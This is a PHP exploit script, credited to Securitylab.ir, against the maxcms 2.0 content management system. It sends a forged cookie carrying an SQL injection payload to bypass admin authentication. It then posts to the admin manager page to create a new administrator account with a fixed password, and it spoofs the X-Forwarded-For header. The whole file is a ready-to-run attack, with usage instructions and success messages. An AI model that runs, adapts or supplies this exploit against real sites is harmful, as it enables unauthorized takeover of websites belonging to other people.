<?php
print_r('
+---------------------------------------------------------------------------+
maxcms2.0 creat new admin exploit
by Securitylab.ir
+---------------------------------------------------------------------------+
');

if ($argc < 3) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path
host:      target server (ip/hostname)
path:      path to maxcms
Example:
php '.$argv[0].' localhost /maxcms2/
+---------------------------------------------------------------------------+
');
    exit;
}

error_reporting(7);
ini_set('max_execution_time', 0);

$host = $argv[1];
$path = $argv[2];
$name = rand(1,10000);
$cmd = 'm_username=securitylab'.$name.'&m_pwd=securitylab&m_pwd2=securitylab&m_level=0';

$resp = send($cmd);
if (!eregi('alert',$resp)) {echo"[~]bad!,exploit failed";exit;}

print_r('
+---------------------------------------------------------------------------+
[+]cool,exploit seccuss
[+]you have add a new adminuser securitylab'.$name.'/securitylab
+---------------------------------------------------------------------------+
');


function send($cmd)
{
    global $host, $path;
    $message = "POST ".$path."admin/admin_manager.asp?action=add HTTP/1.1\r\n";
    $message .= "Accept: */*\r\n";
    $message .= "Referer: http://$host$path\r\n";
    $message .= "Accept-Language: zh-cn\r\n";
    $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $message .= "User-Agent: securitylab\r\n";
    $message .= "X-Forwarded-For:1.1.1.1\r\n";
    $message .= "Host: $host\r\n";
    $message .= "Content-Length: ".strlen($cmd)."\r\n";
    $message .= "Cookie:
m_username=securitylab'%20union%20select%20663179683474,0%20from%20m_manager%20where%20m_username%3d'admin;
m_level=0;
checksecuritylab'%20union%20select%20663179683474,0%20from%20m_manager%20where%20m_username%3d'admin=cf144fd7a325d1088456838f524ae9d7\r\n";
    $message .= "Connection: Close\r\n\r\n";
    $message .= $cmd;
    echo $message;

    $fp = fsockopen($host, 80);
    fputs($fp, $message);

    $resp = '';

    while ($fp && !feof($fp))
    $resp .= fread($fp, 1024);
    echo $resp;
    return $resp;
}
?>
